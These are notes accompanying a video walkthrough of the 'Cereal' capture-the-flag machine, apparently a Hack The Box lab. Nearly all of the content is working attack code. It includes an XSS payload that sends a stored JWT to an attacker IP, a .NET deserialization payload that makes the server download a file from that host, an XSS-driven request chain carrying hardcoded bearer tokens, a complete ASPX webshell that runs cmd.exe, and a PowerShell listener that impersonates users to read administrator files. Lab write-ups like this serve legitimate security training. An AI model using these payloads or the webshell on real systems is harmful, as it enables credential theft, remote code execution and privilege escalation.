---
description: 'Notes for https://youtu.be/tjaW1KC7lBI'
---

# Cereal

#### GitTools

[https://github.com/internetwache/GitTools](https://github.com/internetwache/GitTools)

#### Auth Fiddle

[https://dotnetfiddle.net/dWBKL4](https://dotnetfiddle.net/dWBKL4)

#### Steal JWT from Local Storage via XSS

[https://snyk.io/vuln/npm:react-marked-markdown@1.4.6](https://snyk.io/vuln/npm:react-marked-markdown@1.4.6)

```javascript
{
"RequestID":1000,
"json":"{\"title\":\"[y](javascript: (function (&#41; {window.location.href=\\\"http://10.10.14.91:8000/x\\\"+localStorage.getItem('currentUser'&#41;;}&#41;(&#41;;);\",\"flavor\":\"x)\",\"color\":\"x\",\"description\":\"x\"}"
}
```

#### Deserialization Fiddle

[https://dotnetfiddle.net/u5wV8X](https://dotnetfiddle.net/u5wV8X)

#### Store Deserialization Payload  

```javascript
{
"RequestId":1001,
"JSON":"{\"$type\":\"Cereal.DownloadHelper, cereal, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null\",\"URL\":\"http://10.10.14.91/cmd.aspx\",\"FilePath\":\"c:\\\\inetpub\\\\source\\\\uploads\\\\xct.aspx\"}"
}
```

#### Trigger Deserialization Payload via XSS

```javascript
{
"json":"{\"title\":\"[xhr](javascript:(function (&#41; {var x1=new XMLHttpRequest(&#41;;x1.open('GET','https://cereal.htb/requests/1001'&#41;;x1.setRequestHeader('Authorization','Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjEiLCJuYmYiOjE2MDYwNTcxMTksImV4cCI6MTkyMTU4OTkxOSwiaWF0IjoxNjA2MDU3MTE5fQ.o9NIIeA9lnbaIopr3y1BlVh46l10OdOIfBX7wyspoBY'&#41;;x1.withCredentials=true;x1.send(&#41;;var x2=new XMLHttpRequest(&#41;;x2.open('GET','https://10.10.14.91:8000/proof'&#41;;x2.setRequestHeader('Authorization','Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjEiLCJuYmYiOjE2MDYwNTcxMTksImV4cCI6MTkyMTU4OTkxOSwiaWF0IjoxNjA2MDU3MTE5fQ.o9NIIeA9lnbaIopr3y1BlVh46l10OdOIfBX7wyspoBY'&#41;;x2.withCredentials=true;x2.send(&#41;;}&#41;(&#41;;)\",\"flavor\":\"x)\",\"color\":\"x\",\"description\":\"x\"}"
} 
```

#### ASPX Shell

```aspnet
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen asp.net webshell</title>
</HEAD>
<body >
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
</form>
</body>
</HTML>

<!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) -->
<!--    http://michaeldaw.org   04/2007    -->
```

#### Impersonation PowerShell Webserver

```csharp
[System.Reflection.Assembly]::LoadWithPartialName("System.Web")
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://localhost:7000/")
$listener.AuthenticationSchemes = [System.Net.AuthenticationSchemes]::IntegratedWindowsAuthentication
$listener.Start()

do {
    Write-Host "Listening..."
    $context = $listener.GetContext()
    $requestUrl = $context.Request.Url
    $response = $context.Response
    $context.User.Identity.Impersonate()

    $Content = ""
    try{
      # run any command as admin here
      type C:\users\administrator\desktop\root.txt
    } catch [System.UnauthorizedAccessException] {   
        $response.StatusCode = 401
        $Content = [System.Text.Encoding]::UTF8.GetBytes("")
    } catch [System.Management.Automation.ItemNotFoundException] {        
        $response.StatusCode = 404
        $Content = [System.Text.Encoding]::UTF8.GetBytes("")
    } catch {
        $_
        $Content =  "$($_.InvocationInfo.MyCommand.Name) : $($_.Exception.Message)"
        $Content +=  "$($_.InvocationInfo.PositionMessage)"
        $Content +=  "    + $($_.CategoryInfo.GetMessage())"
        $Content +=  "    + $($_.FullyQualifiedErrorId)"
        $Content = [System.Text.Encoding]::UTF8.GetBytes($Content)
        $response.StatusCode = 500
    }
    $response.ContentLength64 = $Content.Length
    $response.OutputStream.Write($Content, 0, $Content.Length)
    $response.Close()
    Start-Sleep -Seconds 1  
} while ($listener.IsListening)
```



